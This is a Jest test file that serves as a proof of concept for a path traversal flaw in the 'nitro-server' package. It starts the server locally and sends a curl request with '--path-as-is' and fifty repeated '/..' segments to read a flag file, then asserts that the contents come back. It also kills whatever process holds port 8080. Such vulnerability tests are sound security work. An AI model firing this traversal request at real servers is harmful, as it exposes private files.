var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 8080/tcp");
  } catch (e) {}
});
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in nitro-server", (done) => {
  expect.assertions(1);
  const pkg = require("nitro-server");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8080/tcp", () => {});
  } catch (e) {}
  pkg.start("");
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
